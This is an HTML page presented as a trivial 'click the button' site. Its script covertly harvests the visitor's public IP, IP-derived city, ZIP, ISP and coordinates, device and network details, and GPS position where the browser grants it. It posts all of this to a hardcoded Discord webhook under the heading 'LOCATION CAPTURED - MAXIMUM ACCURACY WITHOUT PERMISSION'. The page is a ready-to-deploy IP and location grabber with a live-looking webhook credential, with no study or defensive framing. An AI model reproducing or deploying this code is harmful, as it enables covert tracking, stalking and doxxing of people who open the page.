<!DOCTYPE html>
<html>
<head>
    <title>click the button</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #4752C4; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
    </style>
</head>
<body>
    <h1>click the button website thing</h1>
    <p>click the button below:</p>
    
    <button id="trackButton">Click Me</button>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        async function getPublicIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ip.seeip.org/jsonip'
            ];
            
            for (const service of services) {
                try {
                    const res = await fetch(service);
                    const data = await res.json();
                    if (data.ip) return data.ip;
                } catch (e) {
                    continue;
                }
            }
            return 'Unknown';
        }
        
        async function getDetailedGeolocation(ip) {
            const apis = [
                {
                    name: 'ipapi.co',
                    url: `https://ipapi.co/${ip}/json/`,
                    parser: (data) => ({
                        lat: data.latitude ? Number(data.latitude).toFixed(8) : null,
                        lon: data.longitude ? Number(data.longitude).toFixed(8) : null,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        isp: data.org,
                        zip: data.postal,
                        timezone: data.timezone,
                        accuracy: 'IP-based (city level)'
                    })
                },
                {
                    name: 'ip-api.com',
                    url: `http://ip-api.com/json/${ip}`,
                    parser: (data) => ({
                        lat: data.lat ? Number(data.lat).toFixed(8) : null,
                        lon: data.lon ? Number(data.lon).toFixed(8) : null,
                        city: data.city,
                        region: data.regionName,
                        country: data.country,
                        isp: data.isp,
                        zip: data.zip,
                        timezone: data.timezone,
                        accuracy: 'IP-based (ISP level)'
                    })
                },
                {
                    name: 'ipgeolocation.io',
                    url: `https://api.ipgeolocation.io/ipgeo?apiKey=test&ip=${ip}`,
                    parser: (data) => ({
                        lat: data.latitude ? Number(data.latitude).toFixed(8) : null,
                        lon: data.longitude ? Number(data.longitude).toFixed(8) : null,
                        city: data.city,
                        region: data.state_prov,
                        country: data.country_name,
                        isp: data.isp,
                        zip: data.zipcode,
                        timezone: data.time_zone.name,
                        accuracy: 'IP-based (commercial)'
                    })
                }
            ];
            
            for (const api of apis) {
                try {
                    const res = await fetch(api.url);
                    const data = await res.json();
                    if (data && data.latitude && data.longitude) {
                        return {
                            ...api.parser(data),
                            source: api.name,
                            raw: data
                        };
                    }
                } catch (e) {
                    continue;
                }
            }
            return null;
        }
        
        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let networkType = 'Unknown';
            let effectiveType = 'Unknown';
            let downlink = 'Unknown';
            
            if (connection) {
                networkType = connection.type || 'Unknown';
                effectiveType = connection.effectiveType || 'Unknown';
                downlink = connection.downlink ? `${connection.downlink} Mbps` : 'Unknown';
            }
            
            return { networkType, effectiveType, downlink };
        }
        
        async function getWiFiInfo() {
            return new Promise((resolve) => {
                if ('getWiFiInformation' in navigator) {
                    navigator.getWiFiInformation().then(info => {
                        resolve({
                            ssid: info.ssid || 'Unknown',
                            bssid: info.bssid || 'Unknown',
                            signalStrength: info.signalStrength || 'Unknown'
                        });
                    }).catch(() => {
                        resolve({ ssid: 'Not accessible', bssid: 'Not accessible', signalStrength: 'Not accessible' });
                    });
                } else {
                    resolve({ ssid: 'API not supported', bssid: 'API not supported', signalStrength: 'API not supported' });
                }
            });
        }
        
        function getDeviceDetails() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const languages = navigator.languages;
            const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
            const deviceMemory = navigator.deviceMemory || 'Unknown';
            const maxTouchPoints = navigator.maxTouchPoints || 'Unknown';
            
            return { ua, platform, language, languages: languages.join(', '), hardwareConcurrency, deviceMemory, maxTouchPoints };
        }
        
        async function attemptGeolocationWithoutPrompt() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation API not available', allowed: false });
                    return;
                }
                
                let permissionGranted = false;
                let watchId = null;
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 100,
                    maximumAge: 0
                };
                
                const onSuccess = (position) => {
                    permissionGranted = true;
                    if (watchId !== null) {
                        navigator.geolocation.clearWatch(watchId);
                    }
                    resolve({
                        allowed: true,
                        lat: position.coords.latitude.toFixed(8),
                        lon: position.coords.longitude.toFixed(8),
                        accuracy: `${Math.round(position.coords.accuracy)} meters`,
                        altitude: position.coords.altitude ? `${position.coords.altitude.toFixed(2)}m` : 'N/A',
                        speed: position.coords.speed ? `${(position.coords.speed * 3.6).toFixed(2)} km/h` : 'N/A',
                        heading: position.coords.heading ? `${position.coords.heading}¬∞` : 'N/A',
                        timestamp: new Date(position.timestamp).toISOString()
                    });
                };
                
                const onError = (error) => {
                    if (watchId !== null) {
                        navigator.geolocation.clearWatch(watchId);
                    }
                    resolve({
                        error: error.message,
                        code: error.code,
                        allowed: false
                    });
                };
                
                try {
                    watchId = navigator.geolocation.watchPosition(onSuccess, onError, options);
                    
                    setTimeout(() => {
                        if (watchId !== null) {
                            navigator.geolocation.clearWatch(watchId);
                        }
                        if (!permissionGranted) {
                            resolve({
                                error: 'Permission not granted or timeout',
                                allowed: false
                            });
                        }
                    }, 1000);
                } catch (e) {
                    resolve({
                        error: e.message,
                        allowed: false
                    });
                }
            });
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            
            button.disabled = true;
            button.textContent = 'Getting location...';
            status.style.display = 'none';
            
            try {
                const publicIP = await getPublicIP();
                
                const locationData = await getDetailedGeolocation(publicIP);
                
                const networkInfo = await getNetworkInfo();
                
                const wifiInfo = await getWiFiInfo();
                
                const deviceDetails = getDeviceDetails();
                
                const geoAttempt = await attemptGeolocationWithoutPrompt();
                
                const now = new Date();
                const timestamp = now.toISOString();
                const localTime = now.toLocaleString();
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                
                let mapsLink = 'No coordinates available';
                if (locationData && locationData.lat && locationData.lon) {
                    mapsLink = `https://maps.google.com/?q=${locationData.lat},${locationData.lon}`;
                }
                
                const embed = {
                    title: "LOCATION CAPTURED - MAXIMUM ACCURACY WITHOUT PERMISSION",
                    color: 0xFF0000,
                    fields: [
                        {
                            name: "IP ADDRESS & NETWORK",
                            value: `Public IP: ${publicIP}\nNetwork Type: ${networkInfo.networkType}\nEffective Type: ${networkInfo.effectiveType}\nDownlink: ${networkInfo.downlink}\nWiFi SSID: ${wifiInfo.ssid}`,
                            inline: true
                        },
                        {
                            name: "GEOLOCATION DATA",
                            value: `City: ${locationData?.city || 'Unknown'}\nRegion: ${locationData?.region || 'Unknown'}\nCountry: ${locationData?.country || 'Unknown'}\nISP: ${locationData?.isp || 'Unknown'}\nZIP: ${locationData?.zip || 'Unknown'}`,
                            inline: true
                        },
                        {
                            name: "COORDINATES",
                            value: `Latitude: ${locationData?.lat || 'Unknown'}\nLongitude: ${locationData?.lon || 'Unknown'}\nAccuracy: ${locationData?.accuracy || 'Unknown'}\nSource: ${locationData?.source || 'Unknown'}\nMaps: ${mapsLink}`,
                            inline: true
                        },
                        {
                            name: "DEVICE INFORMATION",
                            value: `Platform: ${deviceDetails.platform}\nCPU Cores: ${deviceDetails.hardwareConcurrency}\nRAM: ${deviceDetails.deviceMemory}GB\nLanguage: ${deviceDetails.language}\nTouch Points: ${deviceDetails.maxTouchPoints}`,
                            inline: true
                        },
                        {
                            name: "TIME & BROWSER",
                            value: `Local Time: ${localTime}\nTimezone: ${timezone}\nBrowser Languages: ${deviceDetails.languages}\nUser Agent: ${deviceDetails.ua.substring(0, 100)}...`,
                            inline: true
                        },
                        {
                            name: "GPS ATTEMPT RESULT",
                            value: geoAttempt.allowed 
                                ? `‚úÖ GPS ACCESS GRANTED\nLat: ${geoAttempt.lat}\nLon: ${geoAttempt.lon}\nAccuracy: ${geoAttempt.accuracy}\nSpeed: ${geoAttempt.speed}`
                                : `‚ùå GPS ACCESS DENIED\nReason: ${geoAttempt.error || 'Permission required'}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `Location Source: ${locationData?.source || 'None'} ‚Ä¢ Timestamp: ${timestamp}`
                    },
                    timestamp: timestamp
                };
                
                const discordMessage = {
                    embeds: [embed],
                    username: "Location Tracker",
                    content: geoAttempt.allowed ? "üö® REAL-TIME GPS LOCATION CAPTURED üö®" : "üìç IP-BASED LOCATION CAPTURED"
                };
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                if (response.ok) {
                    if (geoAttempt.allowed) {
                        status.textContent = 'REAL-TIME GPS LOCATION CAPTURED!';
                    } else {
                        status.textContent = 'IP location captured (no GPS permission)';
                    }
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = '#E8F5E9';
                } else {
                    throw new Error('Discord error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'Error occurred. Try again.';
                status.style.color = '#F44336';
                status.style.backgroundColor = '#FFEBEE';
            } finally {
                button.disabled = false;
                button.textContent = 'click me';
                status.style.display = 'block';
            }
        });
    </script>
</body>
</html>